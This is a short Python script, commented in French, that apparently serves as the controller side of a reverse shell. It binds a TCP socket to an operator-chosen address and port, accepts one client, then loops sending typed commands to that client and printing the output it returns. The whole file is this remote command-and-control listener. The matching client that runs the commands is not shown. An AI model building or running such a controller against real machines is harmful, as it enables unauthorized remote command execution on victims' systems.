import socket 
import subprocess

SRV_ADDR = input("IP address : ")
SRV_PORT = int(input("Port :"))
#On démarre le serveur sur l'adresse IP et le port choisis en entrée et on vérifie que le client est bien connecté

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SRV_ADDR,SRV_PORT))
s.listen(1)
print("server started")
client, address = s.accept()
print("connected address : ", address)

#On envoie les commandes au client et on affiche le résultat
while 1 : 
	command = input('Enter Command : ')
	command = command.encode()
	client.send(command)
	print('[+] Command sent')
	output = client.recv(1024)
	output = output.decode()
	print(f"Output: {output}")

